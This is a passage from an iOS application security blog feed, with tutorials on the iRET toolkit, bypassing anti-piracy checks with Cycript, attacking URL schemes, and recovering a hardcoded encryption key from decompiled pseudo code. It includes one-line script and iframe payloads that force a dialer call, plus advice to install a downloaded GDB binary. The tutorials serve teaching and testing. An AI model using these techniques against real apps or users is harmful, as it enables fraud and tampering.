&lt;p&gt;Once the application is selected, iRET gives us this info in the binary analysis tab. iRET uses otool to analyze the binary and gives information such as whether PIE is enable, whether stack smashing protection and automatic referencing counting (ARC) is enabled or not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next tab shows info that the application has stored in the keychain. iRET uses Keychain_dumper tool to figure this out. Normally, i would be running keychain_dumper using the command line. Using iRET makes it much more easy to find out this information. For me, this feature didn’t work though.&lt;/p&gt;

&lt;p&gt;The next tab is database analysis. iRET searches for all the database files (.db or .sqlite) in the application sandbox and dumps out all the content from these database files for us to analyze.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The log files tab searches for all the log and text files and allows us to monitor the contents of it. For me, iRET wasn’t able to find out the system log file though.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next tab is the plist viewer. The application looks for all the .plist files in the application sandbox and displays us the list so we can analyze the contents of each of the files. This feature could be very useful in quickly analyzing the contents stored by the application in NSUserDefaults, the main plist file that can give us information like the url scheme for the app or any other plist file that might contain some important information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/13.png&quot; alt=&quot;13&quot; /&gt; &lt;img src=&quot;/images/posts/ios32/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next tab which is Header files does the following. If the application is encrypted, iRET will decrypt the application. It then dumps the class information for this file and dumps them into seperate header files that are displayed in the dropdown as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you select a header file, the content of the header is converted into a theos logify format, which the user can use in the theos tab for quick theos tweak creation. For me, this feature didn’t work and after a brief discussion with the author on twitter we still were not able to figure out the problem. However, here is the screenshot from the author’s blog that shows the contents of the header file being converted into logify format.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.veracode.com/wp-content/uploads/2014/03/Figure8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Theos tab allows us to create, build and deploy a theos tweak for the application in just a few minutes. Once you enter the information for your tweak, it can allow you to edit the theos files (Tweak.xm, Makefile) , build and deploy the tweak. Please note in order to build and deploy the tweak, you will need to have alteast one SDK installed in the folder /var/theos/sdks on your device. You can find the sdk installed on your Mac (if you have Xcode installed) in the location &lt;em&gt;/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS7.0.sdk&lt;/em&gt; We will cover writing tweaks using Theos later in this series.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The screenshot tab shows the application snapshot taken by iOS when the application enters into the background. These snapshots are stored in the application sandbox without any encryption and might reveal some confidential informaiton.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios32/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;iRET is a very handy tool for analyzing the security of iOS apps and can really save you a lot of time with some of its features. The tool has just been released and hence contain a few bugs but i can clearly see this becoming into a very handy tool in the near future. The purpose of this article was to just give you an introduction with this tool. This article will be updated as iRET receives more features and bug fixes.&lt;/p&gt;

&lt;p&gt;You can find the blog post regarding the tool from the author &lt;a href=&quot;https://blog.veracode.com/2014/03/introducing-the-ios-reverse-engineering-toolkit/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 31 - The problem with using third party libraries for securing your apps</title>
   <link href="https://bitbrain.github.io/2014/03/18/ios-application-security-part-31-the-problem-with-using-third-party-libraries-for-securing-your-apps.html"/>
   <updated>2014-03-18T17:40:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/03/18/ios-application-security-part-31-the-problem-with-using-third-party-libraries-for-securing-your-apps</id>
   <content type="html">&lt;p&gt;In this article, we will talk about why we shouldn’t completely rely on using third party libraries for securing our apps. Usually, some of the things we try to do in our application are adding checks to detect piracy, jailbroken device etc. It is such a pain to write all the code from scratch which is why we usually resort to using third party libraries that can get the job done for us. In this example, we will be looking at a library named &lt;em&gt;AntiPiracy&lt;/em&gt; which can be found on &lt;a href=&quot;https://github.com/Shmoopi/AntiPiracy&quot;&gt;this&lt;/a&gt; url that aims to solve our problem. On a first glance, it looks amazing .. here is a snippet of the description from it’s github page &lt;em&gt;The Full Shmoopi Anti-Piracy Library utilizes over a dozen algorithms to detect piracy, (not just four) including: *Signer Identity Checks *Process ID Checks *Plist Checks *Bundled Item Checks (CodeRules, Resources, Etc) *Encryption Checks *Anti-Debugging *Encryption Checks *Anti-Tampering *Binary Checks *Integrity Checks *CRC Checks *MD5/SHA1 Hashing Checks *And much, much more…&lt;/em&gt; Looks great. Here is a screenshot from its Github page that explains the implementation. &lt;img src=&quot;/images/posts/ios31/1.png&quot; alt=&quot;1&quot; /&gt; Well well ! This looks so simple to bypass. If you have read my &lt;a href=&quot;http://highaltitudehacks.com/2013/07/25/ios-application-security-part-8-method-swizzling-using-cycript&quot;&gt;previous&lt;/a&gt; tutorials on Cycript, you will know that we can simply swizzle the complete implementation for the methods &lt;em&gt;isJailbroken&lt;/em&gt; and &lt;em&gt;isPirated&lt;/em&gt; by using cycript as shown in the image below. &lt;img src=&quot;/images/posts/ios31/2.png&quot; alt=&quot;2&quot; /&gt; I think the author has done a great job of building such a comprenhensive list of checks in one method. The mistake is on our side, we shouldn’t just blindly use third party libraries and rely on them for protecting our apps. So how do me fix this ? Well, honestly there is not way to fix it. But here is one way that will make the job for the attacker much more difficult.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;ol&gt;
  &lt;li&gt;Change the class name SFAntiPiracy to UIColorAdditions or something similar that might not look important at a first glance.&lt;/li&gt;
  &lt;li&gt;Change the method names isJailbroken and isPirated to something like isDefaultColor.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will make the attacker believe that these methods are not of much significance when he is checking our the class-dump output of our application. Consequently, he will move on to some other classes or view controllers that he thinks are much more important. So here you go, there is definitely a problem with using third party applications as is without any modification. The things that make the code easily understandable (using proper naming conventions) can actually be the reason for the failure of the application.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>How to distribute IPA file for jailbroken devices</title>
   <link href="https://bitbrain.github.io/2014/03/12/how-to-distribute-ipa-for-jailbroken-devices.html"/>
   <updated>2014-03-12T11:53:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/03/12/how-to-distribute-ipa-for-jailbroken-devices</id>
   <content type="html">&lt;p&gt;So i have been getting a few queries on how to create an IPA file from Xcode and distribute it for jailbroken devices. Here is how i did it for &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS App&lt;/a&gt;. First we need to run the application using Xcode on the device. This requires a valid provisioning profile. I am doing this on Xcode 5.x but on the previous versions of Xcode, it was possible to run the application on the device without a valid provisioning profile. Once the application is installed on the device, copy the .app folder from the device on your system. &lt;img src=&quot;/images/posts/distribute/1.png&quot; alt=&quot;2&quot; /&gt;  Navigate inside this directory on your system and self sign the application binary using ldid. Make sure you have a proper working version of ldid installed. &lt;img src=&quot;/images/posts/distribute/2.png&quot; alt=&quot;2&quot; /&gt; Now create a new folder and name it Payload. Put the .app folder inside it and compress the Payload folder. It will be named Payload.zip. Rename Payload.zip to [APP_NAME].ipa, for e.g DamnVulnerableiOSApp.ipa. Once this is done, you can install the application using similar techniques as mentioned in the youtube video below.&amp;lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;//www.youtube.com/embed/PwES8Sk00wk&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 30 - Attacking URL schemes</title>
   <link href="https://bitbrain.github.io/2014/03/07/ios-application-security-part-30-attacking-url-schemes.html"/>
   <updated>2014-03-07T01:25:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/03/07/ios-application-security-part-30-attacking-url-schemes</id>
   <content type="html">&lt;p&gt;In this article, we will look at how we can use a feature in iOS named url schemes to exploit an application. URL schemes are used by applications to communicate with each other. Every application can register for a particular url scheme. For e.g, the &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS application&lt;/a&gt; registers for the url scheme &lt;em&gt;dvia&lt;/em&gt;. This means that any url starting with dvia:// protocol will open up the dvia application. Depending on the parameters and the endpoint in this url, the dvia application can decide what to do it. Another example is the phone application in iOS. It registers for the url scheme &lt;em&gt;tel&lt;/em&gt; and a url like tel://1-393-222-2222 will invoke the phone application and call a number. The problem arises when the url is not validated or the user is not prompted for confirmation in the application before making a particular decision.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The first step is to find the actual url scheme an application is registered to. This information can be found by looking at the info.plist file in the application sandbox folder using any file explorer utility like iExplorer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios30/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this case, we can see that the url scheme for the &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;DVIA&lt;/a&gt; application is dvia.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios30/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An application can register for more than 1 url scheme. For e.g, in the image below, we can see that the Facebook iOS application registers for about 8 url schemes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios30/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next step is to find the actual url structure the application is looking for in order to perform some action. There are a couple of ways of doing it and these steps may or may not work in all the cases. One of the very simple ways is to look for any string in the application starting with that url scheme. This can be done using the strings commands or a utility like Hopper. Note that you will first have to decrypt the application binary using clutch in case the application was downloaded from the App store as all app store binaries are encrypted.So let me copy the decrypted Whatsapp app binary to desktop and open it using Hopper. I know that it’s url scheme is whatsapp, so let me search for the string whatsapp://&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios30/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This can give you some information about the endpoints the application is expecting. For e.g, over here you can open a url like whatsapp://image/xyz to see how the application reacts to it. By supplying a url, i mean just going to safari and typing in the url and see how the whatsapp application reacts to it.&lt;/p&gt;

&lt;p&gt;One of the other ways to find out how the url scheme is being handled is to reverse engineer a particular method in the App delegate file. If you are familiar with a bit of iOS development, you will also know that the method that is called to handle an incoming url is&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;in the App Delegate class.&lt;/p&gt;

&lt;p&gt;So it’s a good idea to search for this method’s implementation using Hopper and try to look at its Pseudo code to find out what is happening.&lt;/p&gt;

&lt;p&gt;In order to prevent vulnerabilities related to url schemes, proper validation should also be performed inside this method. For e.g, the &lt;em&gt;sourceApplication&lt;/em&gt; parameter can be used to find out the application calling this url scheme. You can have a whitelist of the applications that you want to call this url scheme and compare it against this source application. If this calling application is not in the list of whitelisted applications, you should not perform any action. Another important validation step could be to prompt an alert to the user and ask him to confirm the action. This will mostly protect against all url scheme related issues.&lt;/p&gt;

&lt;p&gt;One of the very famous vulnerabilities related to URL schemes was found in the Skype iOS application. The skype application didn’t perform any validation when a url like skype://14085555555?cal was called and made the call to the appropriate number without validation. More details about this vulnerability can be found &lt;a href=&quot;http://software-security.sans.org/blog/2010/11/08/insecure-handling-url-schemes-apples-ios/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In case you are wondering how the attacker will force the user to call that particular url with the url scheme for the application, it can be done in many ways. The attacker can lure the user into viewing a webpage that can contain some javascript like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;document.location='tel://1123456789'&amp;lt;script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;or iframe like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe src=&quot;tel://1123456789&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;So as we can see, if an application doesn’t validate an incoming url properly, it might lead to a security vulnerability. If you have any questions, please ask them in the comments section below and i will get back to you.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>GDB segmentation fault issue fix with jailbroken device</title>
   <link href="https://bitbrain.github.io/2014/03/06/gdb-issue.html"/>
   <updated>2014-03-06T15:15:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/03/06/gdb-issue</id>
   <content type="html">&lt;p&gt;If you have been experiencing segmentation fault issues with GDB while attaching to a process on a jailbroken iOS device, it is because the GDB that comes with Cydia is broken and you need to install a proper version. You can download a proper working version of GDB from &lt;a href=&quot;https://dl.dropboxusercontent.com/u/34557464/gdb&quot;&gt;here&lt;/a&gt;. You need to copy this executable into &lt;em&gt;/usr/bin&lt;/em&gt; on your jailbroken iOS device and give it executable permissions. If it still doesn’t work, let me know what issue you are facing by writing a comment below.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 29 - Insecure or Broken Cryptography</title>
   <link href="https://bitbrain.github.io/2014/01/17/ios-application-security-part-29-insecure-or-broken-cryptography.html"/>
   <updated>2014-01-17T21:41:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/01/17/ios-application-security-part-29-insecure-or-broken-cryptography</id>
   <content type="html">&lt;p&gt;In this article we will look at an example of Insecure or Broken Cryptography which is a common vulnerability found in most iOS applications. This vulnerability occurs when the data stored on the device is not encrypted properly thereby allowing a malicious user to gain access to that information. There could be many reasons for an improper implementaion of encrytption, using hardcoded keys for encryption, bad algorithms etc can all be the cause for an implementation that is not secure.&lt;/p&gt;

&lt;p&gt;I would recommend you have a look at &lt;a href=&quot;https://developer.apple.com/library/mac/documentation/security/conceptual/cryptoservices/GeneralPurposeCrypto/GeneralPurposeCrypto.html&quot;&gt;Apple’s documentation&lt;/a&gt; on Encrypting and hashing data.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In this article, we will look at an example of how we can spot and break an incorrectly implemented encrytion technique. For this article, we will be testing on the application &lt;a href=&quot;https://github.com/prateek147/InsecureCryptography-Demo&quot;&gt;InsecureCryptography-Demo&lt;/a&gt; that you can download from my Github profile. Download it and run on the simulator or on the device. Let’s look at what this application does. Once you start the application for the first time, it asks you to set up a new password to get started.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you have set up the password, it will prompt you to log in with same password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So lets assume i open this application once the password has already been set. Our task is to bypass this login check. Some of the things that are clear are that this password is being stored locally on the device as no network activity was noted. You can use a proxy like Burpsuite to observe the traffic and see that there is no network traffic, so everything is being done locally.&lt;/p&gt;

&lt;p&gt;Let’s try and open the application in Hopper. Please check article 28 in this series to know more about Hopper. Go to Hopper and go to File-&amp;gt;Read Executable to Disassemble.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you have successfully run the application using Xcode, it will install the application in the iOS simulator. Now our task is to find the location of the application binary on our system so we can provide it to Hopper. If you run an application in Xcode, it will generate an application directory inside the folder &lt;em&gt;/Users/$username/Library/Application Support/iPhone Simulator/$ios version of simulator/Applications/&lt;/em&gt;. In my case, the location is &lt;em&gt;/Users/Prateek/Library/Application Support/iPhone Simulator 7.0.3/Applications/&lt;/em&gt;. Once you are in this directory, you have to find your application folder. Using the command ls -al will give you the created date of these folders. The latest one would be our application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Open this folder in Finder using the command &lt;em&gt;open $directoryName&lt;/em&gt; and right click on the .app package and click on &lt;em&gt;Show Package Contents&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Provide this executable to Hopper to disassemble.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once Hopper has analyzed the executable and produced the dissassembly, here is what you get.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the left hand side, you can see stuff like RNEncryptor etc. Looks like this class is being used to encrypt data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On google searching &lt;em&gt;RNEncryptor&lt;/em&gt;, we find that it is a open source Github class used for encrypting data. Anyways, our task is to bypass the login. So lets search for the method that gets called to perform the authentication check. Let’s go back to the app. If you look at the image below, there is no login button to tap. The login check happens once you tap on the &lt;em&gt;return&lt;/em&gt; button in the text field.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And if you are a bit familiar with iOS development you should know that if the current view controller is a delegate of this text field, then the method that will be called is &lt;em&gt;-(BOOL)textFieldShouldReturn:(UITextField *)textField&lt;/em&gt;. So lets search for this method in the labels section.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, we can see the disassembly. That’s pretty cool. But you know what’s more cool ? Checking out the pseudo code for this function. Let’s click on the &lt;em&gt;Pseudo Code&lt;/em&gt; button on the top right to check out the Pseudo code for this function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, this pretty much gives everything away. And this is why i love Hopper so much. Here is the pseudo code generated for this method.&lt;/p&gt;

&lt;pre&gt;	function methImpl_ViewController_textFieldShouldReturn_ {
	    var_372 = arg_0;
	    var_368 = arg_4;
	    var_364 = 0x0;
	    _PIC_register_ = eax;
	    objc_storeStrong(&amp;amp;var_364, arg_8);
	    var_312 = 0x9;
	    var_308 = 0x1;
	    eax = NSSearchPathForDirectoriesInDomains(0x9, 0x1, 0x1);
	    eax = [eax retain];
	    var_304 = 0x0;
	    var_300 = eax;
	    eax = [eax objectAtIndex:0x0];
	    eax = [eax retain];
	    var_296 = eax;
	    eax = [eax stringByAppendingPathComponent:@&quot;/secret-data&quot;];
	    eax = [eax retain];
	    var_360 = eax;
	    [var_296 release];
	    [var_300 release];
	    var_292 = var_364;
	    eax = [var_372 passwordTextField];
	    eax = [eax retain];
	    var_288 = eax;
	    [eax release];
	    if (var_292 != var_288) goto loc_4fab;
	    goto loc_4b74;

	loc_4fab:
	    var_172 = var_364;
	    eax = [var_372 returningUserTextField];
	    eax = [eax retain];
	    var_168 = eax;
	    [eax release];
	    if (var_172 != var_168) goto loc_53a5;
	    goto loc_4ff8;

	loc_53a5:
	    var_379 = 0x0;
	    var_356 = 0x1;

	loc_53b0:
	    var_104 = 0x0;
	    objc_storeStrong(&amp;amp;var_360, 0x0);
	    var_100 = 0x0;
	    objc_storeStrong(&amp;amp;var_364, 0x0);
	    eax = SIGN_EXTEND(var_379);
	    return eax;

	loc_4ff8:
	    eax = [var_372 returningUserTextField];
	    eax = [eax retain];
	    var_164 = eax;
	    eax = [eax text];
	    eax = [eax retain];
	    var_160 = 0x4;
	    var_156 = eax;
	    eax = [eax dataUsingEncoding:0x4];
	    eax = [eax retain];
	    var_336 = eax;
	    [var_156 release];
	    [var_164 release];
	    var_332 = 0x0;
	    eax = [NSData dataWithContentsOfFile:var_360];
	    eax = [eax retain];
	    var_328 = eax;
	    var_320 = var_332;
	    eax = [RNDecryptor decryptData:var_328 withPassword:@&quot;Secret-Key&quot; error:&amp;amp;var_320];
	    eax = [eax retain];
	    var_152 = eax;
	    objc_storeStrong(&amp;amp;var_332, var_320);
	    var_324 = var_152;
	    eax = [var_336 isEqualToData:var_324];
	    if (eax != 0x0) {
	            eax = [var_372 loggedInLabel];
	            eax = [eax retain];
	            var_148 = 0x0;
	            var_144 = eax;
	            [eax setHidden:0x0];
	            [var_144 release];
	            eax = [var_372 returningUserTextField];
	            eax = [eax retain];
	            var_140 = 0x1;
	            var_136 = eax;
	            [eax setHidden:0x1];
	            [var_136 release];
	            eax = [var_372 returningUserLabel];
	            eax = [eax retain];
	            var_132 = 0x1;
	            var_128 = eax;
	            [eax setHidden:0x1];
	            [var_128 release];
	            var_356 = 0x0;
	    }
	    else {
	            var_124 = @&quot;OK&quot;;
	            var_120 = @&quot;Oops&quot;;
	            var_116 = @&quot;Password is incorrect&quot;;
	            var_112 = 0x0;
	            eax = [UIAlertView alloc];
	            eax = [eax initWithTitle:var_120 message:var_116 delegate:0x0 cancelButtonTitle:var_124 otherButtonTitles:0x0];
	            var_108 = eax;
	            [eax show];
	            [var_108 release];
	            var_379 = 0x0;
	            var_356 = 0x1;
	    }
	    ecx = esp;
	    *ecx = &amp;var_324;
	    *(ecx + 0x4) = 0x0;
	    objc_storeStrong();
	    ecx = esp;
	    *ecx = &amp;var_328;
	    *(ecx + 0x4) = 0x0;
	    objc_storeStrong();
	    ecx = esp;
	    *ecx = &amp;var_332;
	    *(ecx + 0x4) = 0x0;
	    objc_storeStrong();
	    ecx = esp;
	    *ecx = &amp;var_336;
	    *(ecx + 0x4) = 0x0;
	    objc_storeStrong();
	    if (var_356 != 0x0) goto loc_53b0;
	    goto loc_53a5;

	loc_4b74:
	    eax = [var_364 resignFirstResponder];
	    var_287 = eax;
	    eax = [var_364 text];
	    eax = [eax retain];
	    var_280 = eax;
	    eax = [eax length];
	    var_276 = eax;
	    [var_280 release];
	    if (var_276 != 0x0) goto loc_4c9b;
	    goto loc_4be5;

	loc_4c9b:
	    eax = [var_372 passwordTextField];
	    eax = [eax retain];
	    var_252 = eax;
	    eax = [eax text];
	    eax = [eax retain];
	    var_248 = 0x4;
	    var_244 = eax;
	    eax = [eax dataUsingEncoding:0x4];
	    eax = [eax retain];
	    var_352 = eax;
	    [var_244 release];
	    [var_252 release];
	    var_348 = 0x0;
	    var_340 = var_348;
	    edi = esp;
	    var_240 = 0x12;
	    var_236 = _kRNCryptorAES256Settings;
	    var_232 = *0x158b0;
	    var_228 = edi;
	    var_224 = *0x157bc;
	    *(edi + 0xc) = *var_236;
	    esi = var_228;
	    *(esi + 0x58) = &amp;var_340;
	    *(esi + 0x54) = @&quot;Secret-Key&quot;;
	    *(esi + 0x8) = var_352;
	    *(esi + 0x4) = var_224;
	    *esi = var_232;
	    eax = objc_msgSend();
	    eax = [eax retain];
	    var_220 = eax;
	    objc_storeStrong(&amp;amp;var_348, var_340);
	    var_344 = var_220;
	    var_216 = 0x1;
	    eax = [var_344 writeToFile:var_360 atomically:0x1];
	    var_215 = eax;
	    eax = [NSUserDefaults standardUserDefaults];
	    eax = [eax retain];
	    var_208 = eax;
	    var_204 = 0x1;
	    [eax setBool:0x1 forKey:@&quot;loggedIn&quot;];
	    [var_208 release];
	    eax = [NSUserDefaults standardUserDefaults];
	    eax = [eax retain];
	    var_200 = eax;
	    eax = [eax synchronize];
	    var_199 = eax;
	    [var_200 release];
	    eax = [var_372 firstUserView];
	    eax = [eax retain];
	    var_192 = 0x1;
	    var_188 = eax;
	    [eax setHidden:0x1];
	    [var_188 release];
	    var_184 = 0x0;
	    objc_storeStrong(&amp;amp;var_344, 0x0);
	    var_180 = 0x0;
	    objc_storeStrong(&amp;amp;var_348, 0x0);
	    var_176 = 0x0;
	    objc_storeStrong(&amp;amp;var_352, 0x0);
	    goto loc_53a5;

	loc_4be5:
	    var_272 = @&quot;OK&quot;;
	    var_268 = @&quot;Oops&quot;;
	    var_264 = @&quot;Please enter a password&quot;;
	    var_260 = 0x0;
	    eax = [UIAlertView alloc];
	    eax = [eax initWithTitle:var_268 message:var_264 delegate:0x0 cancelButtonTitle:var_272 otherButtonTitles:0x0];
	    var_256 = eax;
	    [eax show];
	    [var_256 release];
	    var_379 = 0x0;
	    var_356 = 0x1;
	    goto loc_53b0;
	}

&lt;/pre&gt;

&lt;p&gt;Some things that we can interpret from this Pseudo code.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;pre&gt;eax = [eax text];
	    eax = [eax retain];
	    var_160 = 0x4;
	    var_156 = eax;
	    eax = [eax dataUsingEncoding:0x4];&lt;/pre&gt;

    &lt;p&gt;The text from the text field is being converted into NSData using the method dataUsingEncoding.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;pre&gt;eax = NSSearchPathForDirectoriesInDomains(0x9, 0x1, 0x1);
	    eax = [eax retain];
	    var_304 = 0x0;
	    var_300 = eax;
	    eax = [eax objectAtIndex:0x0];
	    eax = [eax retain];
	    var_296 = eax;
	    eax = [eax stringByAppendingPathComponent:@&quot;/secret-data&quot;];&lt;/pre&gt;

    &lt;p&gt;This indicates a file with the name &lt;em&gt;secret-data&lt;/em&gt;. If we scroll down a bit, we see this line&lt;/p&gt;

    &lt;pre&gt; eax = [var_344 writeToFile:var_360 atomically:0x1];&lt;/pre&gt;

    &lt;p&gt;Looks like something is being written to this file.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;pre&gt;		var_332 = 0x0;
			    eax = [NSData dataWithContentsOfFile:var_360];
			    eax = [eax retain];
			    var_328 = eax;
			    var_320 = var_332;
			    eax = [RNDecryptor decryptData:var_328 withPassword:@&quot;Secret-Key&quot; error:&amp;amp;var_320];
			&lt;/pre&gt;

    &lt;p&gt;The contents of the file with the name &lt;em&gt;Secret-data&lt;/em&gt; is being read and decrypted with a password.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;pre&gt;eax = [RNDecryptor decryptData:var_328 withPassword:@&quot;Secret-Key&quot; error:&amp;amp;var_320];&lt;/pre&gt;

    &lt;p&gt;It looks like the key used for enryption and decryption is a hardcoded string &lt;em&gt;Secret-Key&lt;/em&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;pre&gt;eax = [var_336 isEqualToData:var_324];&lt;/pre&gt;

    &lt;p&gt;There is a comparison between two kinds of data. The boolean value result is stored in the eax register.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;pre&gt;if (eax != 0x0) {
	            eax = [var_372 loggedInLabel];
	            eax = [eax retain];
	            var_148 = 0x0;
	            var_144 = eax;
	            [eax setHidden:0x0];
	            [var_144 release];
	            eax = [var_372 returningUserTextField];
	            eax = [eax retain];
	            var_140 = 0x1;
	            var_136 = eax;
	            [eax setHidden:0x1];
	            [var_136 release];
	            eax = [var_372 returningUserLabel];
	            eax = [eax retain];
	            var_132 = 0x1;
	            var_128 = eax;
	            [eax setHidden:0x1];
	            [var_128 release];
	            var_356 = 0x0;
	    }
	    else {
	            var_124 = @&quot;OK&quot;;
	            var_120 = @&quot;Oops&quot;;
	            var_116 = @&quot;Password is incorrect&quot;;
	            var_112 = 0x0;
	            eax = [UIAlertView alloc];
	            eax = [eax initWithTitle:var_120 message:var_116 delegate:0x0 cancelButtonTitle:var_124 otherButtonTitles:0x0];
	            var_108 = eax;
	            [eax show];
	            [var_108 release];
	            var_379 = 0x0;
	            var_356 = 0x1;
	    }&lt;/pre&gt;

    &lt;p&gt;Depending on the value of eax, the flow can go to different places. If the value is 0, user will be shown an alert that the password is incorrect. Otherwise, as you might be guessing, the user is logged in.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Well, lets see if we can find the file &lt;em&gt;secret-data&lt;/em&gt; in the application sandbox. On searching just a little bit, we see that this file is present in the Documents folder. On opening it, we find that it contains some data. and the content looks encrypted.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also, on googling a bit on RNEncryptor and RNDecryptor, we see that they are part of an open source library available on Github that can be found &lt;a href=&quot;https://github.com/RNCryptor/RNCryptor&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So from all this information, we can interpret that.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;When the user enters the password, the text is converted into NSData using the method dataUsingEncoding with the param 0x4. The parameter 0x4 corresponds to NSUTF8StringEncoding.&lt;/li&gt;
  &lt;li&gt;Data is read from the file secret-data and decrypted using a hardcoded key&lt;/li&gt;
  &lt;li&gt;The two values found from the above two steps are compared against each other. If they match, the user is logged in.&lt;/li&gt;
&lt;/ul&gt;

